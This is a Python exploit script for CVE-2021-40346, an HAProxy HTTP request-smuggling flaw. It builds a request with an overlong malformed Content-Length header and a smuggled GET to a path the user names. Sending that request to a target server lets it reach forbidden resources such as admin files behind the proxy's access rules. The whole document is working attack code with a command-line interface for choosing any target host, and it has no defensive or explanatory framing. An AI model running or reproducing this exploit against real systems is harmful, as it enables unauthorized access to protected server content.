#! /usr/bin/env python
# Exploit Author: ali <https://github.com/alikarimi999>
# Vendor Homepage: https://www.haproxy.com/
# CVE-2021-40346


from argparse import ArgumentParser
from socket import *
import re
import time


def prepare_request(host, path):
         
   body_scheme = f"GET {path} HTTP/1.1\nDelimiter: GET / HTTP/1.1\nHost: {host}\n\n"

   body_length = len(re.findall(b'^GET.*\n.*Delimiter:.',body_scheme.encode())[0])

   request_scheme = f"""POST / HTTP/1.1
Host: {host}
Content-Length03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L0:
Content-Length:{body_length}\n\n{body_scheme}"""
   
   request = request_scheme.encode()
   return request


def exploit(host, path, port):
   with socket(AF_INET, SOCK_STREAM) as sock:
      
      try:
         sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
         sock.connect((host, port))         
         sock.sendall( prepare_request(host, path) )         
         print('[.] waiting for reponse ...\n\n')
         
         timeout_start = time.time()
         while True:
            recv = sock.recv(4096)
            print(recv.decode())
            
            if recv == b'' or time.time() > timeout_start + 5:
               break
      except error as e:
         sock.close()
         print('''Connection failed! : "you can change this string with e in source if you want to see whats the problem''')



def main():
   parser = ArgumentParser(description="Exploit for CVE-2021-40346 by https://github.com/alikarimi999")
   parser.add_argument("--rhost", type=str, required=True,
      help='Target Ip or Domain (e.g. \"www.example.com\")')
   parser.add_argument("--rport", type=int, required=False, default=80,
      help='Set Target Port (default 80)')
   parser.add_argument("-f", type=str, required=True,
      help="Forbidden file or directory path (e.g. \"/admin/secretfile.php\")")

   args = parser.parse_args()
   
   exploit(args.rhost, args.f, args.rport)
   


if __name__ == "__main__":
    main()